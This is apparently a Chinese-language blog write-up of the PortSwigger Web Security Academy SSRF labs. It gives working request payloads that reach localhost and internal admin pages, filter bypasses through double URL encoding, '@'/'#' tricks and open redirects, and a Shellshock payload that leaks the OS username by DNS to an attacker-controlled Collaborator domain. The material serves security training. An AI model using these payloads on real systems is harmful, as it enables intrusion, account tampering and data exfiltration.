---
title: PortSwigger Web Security Academy SSRF
date: 2022-07-21 14:22:15
categories:
- Web安全
tags:
- SSRF
---

## SSRF简介

**SSRF**（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。

## 漏洞危害

SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。

内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。

## 常见的 SSRF 攻击

**SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。**这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。

### 针对服务器本身的SSRF攻击

在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如`127.0.0.1`（指向环回适配器的保留 IP 地址）或`localhost`（同一适配器的常用名称）。

例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。

在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

在这里，服务器将获取`/admin`URL 的内容并将其返回给用户。

当然，攻击者可以直接访问`/admin`URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对`/admin`URL 的请求来自本地机器本身时，会绕过正常的[访问控制。](https://portswigger.net/web-security/access-control)应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。

### 针对其他后端系统的 SSRF 攻击

服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。

在前面的示例中，假设后端 URL 有一个管理界面` https://192.168.0.68/admin`。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

## 针对本地服务器的基本SSRF

### 靶场地址

[web-security/ssrf/lab-basic-ssrf-against-localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

### 靶场说明

该实验室具有库存检查功能，可从内部系统获取数据。

要完成这个实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。

### 实验步骤

1、浏览`/admin`并观察您无法直接访问管理页面。

![](https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png)

2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。

![](https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png)

![](https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png)

3、将``stockApi`参数中 的 URL 更改为`http://localhost/admin`。发送请求包后能看到管理界面。

![](https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png)

4、读取HTML识别删除目标用户的URL，即：`http://localhost/admin/delete?username=carlos`

![](https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png)

5、成功删除carlos用户。

![](https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png)

![](https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png)

### 小结

为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：

- 访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 **当与服务器本身建立连接时，会绕过检查。**
- 出于灾难恢复的目的，**应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问**。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。
- 管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。

这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。

## 针对其他后端系统的 SSRF 攻击

### 靶场地址

[web-security/ssrf/lab-basic-ssrf-against-backend-system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

### 靶场说明

该实验室具有库存检查功能，可从内部系统获取数据。

要完成实验，请使用库存检查功能`192.168.0.X`在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户`carlos`。

### 实验步骤

简单点说就是上一个实验+爆破url

1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。

2、先清除标记，然后将`stockApi`参数中的url更改为`http://192.168.0.1:8080/admin`，并标记IP地址的最后一位，即标记“1”。

![](https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png)

3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。

![](https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png)

4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。

![image-20220720134033145](https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png)

5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：``/admin/delete?username=carlos`，即可删除`carlos`用户。

![](https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png)

## 常见的 SSRF 防御绕过

通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。

* 绕过基于黑名单的 SSRF防御措施

* 绕过基于白名单的SSRF防御措施

* 通过开放重定向绕过SSRF防御措施

## 基于黑名单的SSRF防御措施绕过

一些应用程序会阻止包含诸如`127.0.0.1`、`localhost`之类的主机名或诸如`/admin`之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：

- 使用替代 IP 表示`127.0.0.1`，例如`2130706433`、`017700000001`或`127.1`。
- 将您自己的域名解析为`127.0.0.1`. 您可以`spoofed.burpcollaborator.net`用于此目的。
- 使用 URL 编码或大小写变体混淆被阻止的字符串。

### 靶场地址

[web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

### 靶场说明

该实验室具有库存检查功能，可从内部系统获取数据。

要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。

开发人员部署了两个需要绕过的SSRF 弱防御措施。

### 实验步骤

1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`，观察到请求被阻止。

![](https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png)

2、通过将 URL 更改为：`http://localhost/`,还是被防火墙拦截了!

![](https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png)

3、通过双 URL 编码将``a`混淆为 `%25%36%31`,此时为`http://loc%25%36%31lhost/`。防火墙未拦截，成功以管理员身份访问系统。

![](https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png)

4、搜索管理面板url

![](https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png)

5、访问管理面板

![](https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png)

6、又拦截了，再次将admin中的`a`url编码两次提交,绕过防火墙!

![](https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png)

7、删除carlos账户

![](https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png)

8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.

![](https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png)

## 基于白名单的 SSRF防御措施

某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。

URL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：

- 您可以使用`@`字符 在主机名之前的 URL 中嵌入凭据。例如：`https://expected-host@evil-host`
- 您可以使用`#`字符来指示 URL 片段。例如：`https://evil-host#expected-host`
- 您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：`https://expected-host.evil-host`
- 您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。
- 您可以一起使用这些技术的组合。

### 靶场地址

[web-security/ssrf/lab-ssrf-with-whitelist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

### 靶场说明

该实验室具有库存检查功能，可从内部系统获取数据。

要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。

**开发人员已经部署了您需要绕过的反 SSRF 防御。**

### 实验思路

1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。

将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。

![](https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png)

2、将 URL 更改为`http://username@stock.weliketoshop.net/`并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。

![](https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png)

3、将`#`附加到用户名后并观察到该 URL 现在被拒绝。

![](https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png)

4、双 URL 编码`#`为`%2523`，并观察到响应，表明服务器已经访问localhost。

![](https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png)

5、改成如下url:访问到admin页面

![](https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png)

6、要访问管理界面并删除目标用户，请将 URL 更改为：`http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`

![](https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png)

## 通过开放重定向漏洞绕过的 SSRF防御

有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。

在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。

例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：

```bash
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

返回重定向到：

```
http://evil-user.net
```

您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

这个 SSRF 漏洞利用有效，因为应用程序首先验证`stockAPI`提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。

### 靶场地址

[web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

### 靶场说明

该实验室具有库存检查功能，可从内部系统获取数据。

要完成实验，请更改库存检查 URL 以访问管理界面`http://192.168.0.12:8080/admin`并删除用户`carlos`。

库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。

### 实验思路

1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。

尝试篡改`stockApi`参数，观察到无法让服务器直接向不同的主机发出请求。

![](https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png)

2、点击“下一个产品”，观察`path`参数被放入重定向响应的Location头中，导致开放重定向。

![](https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png)

3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的`stockApi`参数中。构造payload如下：

``` 
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

   观察库存检查器是否遵循重定向并向您显示管理页面。

![](https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png)

4、修改路径以删除目标用户：

```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![](https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png)

成功删除carlos,完成实验。

## 盲 SSRF 漏洞

盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。

### 什么是盲 SSRF？

当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。

### 盲 SSRF 漏洞的影响是什么？

盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。

### 如何发现和利用盲 SSRF 漏洞

检测盲 SSRF 漏洞最可靠的方法是使用带外 ( [OAST](https://portswigger.net/burp/application-security-testing/oast) ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。

使用带外技术最简单、最有效的方法是使用[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)。您可以使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。

```
提示:
在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。
```

### 带外检测的盲SSRF

简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。

### 靶场地址

[portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

### 靶场说明

该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。

要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。

```
注意事项:
为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。
```

### 实验步骤

1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，转到 Burp 菜单并启动[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)。

![](https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png)

2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。

![](https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png)

3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。

4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。

![](https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png)

5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。

6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。

![](https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png)

## 使用 Shellshock 利用盲SSRF

简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。

### 靶场地址

[web-security/ssrf/blind/lab-shellshock-exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

### 靶场说明

该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。

为了完成实验，请使用此功能对 8080 端口范围内的内部服务器`192.168.0.X`执行[盲 SSRF](https://portswigger.net/web-security/ssrf/blind)攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。

### 实验步骤

1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，从 BApp Store 安装“Collaborator Everywhere”扩展。

![](https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png)

2、将实验室的域添加到 Burp Suite 的[Scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope)，以便 Collaborator Everywhere 将其作为目标。

浏览网站。

![](https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png)

![image-20220721125833574](https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png)

3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。

![](https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png)

4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。

![](https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png)

5、将请求发送到产品页面给 Burp Intruder。

6、使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：

```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。

单击“清除 §”，将 Referer 标头更改为`http://192.168.0.1:8080`突出显示 IP 地址的最后一个八位字节（数字`1`），单击“添加 §”。

![](https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png)

8、切换到 Payloads 选项卡，将有效负载类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。

![](https://s2.loli.net/2022/07/21/ZTIia8tKdES7FWk.png)

9、点击“开始攻击”。

攻击完成后，返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。[您应该会看到由成功的盲SSRF 攻击](https://portswigger.net/web-security/ssrf)命中的后端系统发起的 DNS 交互。操作系统用户的名称应出现在 DNS 子域中。

![](https://s2.loli.net/2022/07/21/krIKytbocuZSFQv.png)

要完成实验，请输入操作系统用户的名称。

![](https://s2.loli.net/2022/07/21/VUYweFM2ZaLK9p3.png)

另一种利用盲SSRF漏洞的途径是诱使应用程序连接到攻击者控制的系统，并向建立连接的HTTP客户端返回恶意响应。如果您可以利用服务器 HTTP 实现中的严重客户端漏洞，您可能能够在应用程序基础架构中实现远程代码执行。[点击详细阅读](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient)。

## 为 SSRF 漏洞寻找隐藏的攻击面

许多服务器端请求伪造漏洞相对容易被发现，因为应用程序的正常流量涉及包含完整 URL 的请求参数。SSRF 的其他示例更难找到。

### 请求中的部分 URL

有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。

### 数据格式中的 URL

一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到[XXE 注入](https://portswigger.net/web-security/xxe)的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看[XXE 注入](https://portswigger.net/web-security/xxe)漏洞时，我们将更详细地介绍这一点。

### 通过Referer头的SSRF

一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅[盲 SSRF 漏洞](https://portswigger.net/web-security/ssrf/blind)。


------


>参考链接：
>
>[Web Security Academy-SSRF](https://portswigger.net/web-security/ssrf)
>
>[portswigger ssrf lab 服务器端请求伪造靶场](https://www.ddosi.org/ssrf-lab/)
>
>[Web安全学习笔记-4.4 SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)
>
>[关于SSRF和多种绕过方式](https://www.freebuf.com/vuls/321535.html)
>
>[URL中“#” “？” &“”号的作用](https://www.cnblogs.com/kaituorensheng/p/3776527.html)
